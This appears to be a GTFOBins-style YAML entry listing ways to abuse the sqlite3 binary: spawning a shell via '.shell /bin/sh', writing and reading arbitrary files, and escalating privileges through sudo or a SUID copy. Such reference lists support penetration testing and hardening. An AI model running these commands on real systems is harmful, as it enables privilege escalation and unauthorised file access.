---
functions:
  execute-interactive:
    - code: sqlite3 /dev/null '.shell /bin/sh'
  file-write:
    - code: |
        LFILE=file_to_write
        sqlite3 /dev/null -cmd ".output $LFILE" 'select "data";'
  file-read:
    - code: |
        LFILE=file_to_read
        sqlite3 << EOF
        CREATE TABLE t(line TEXT);
        .import $LFILE t
        SELECT * FROM t;
        EOF
  sudo-enabled:
    - code: sudo sqlite3 /dev/null '.shell /bin/sh'
  suid-limited:
    - code: "./sqlite3 /dev/null '.shell /bin/sh'"
---
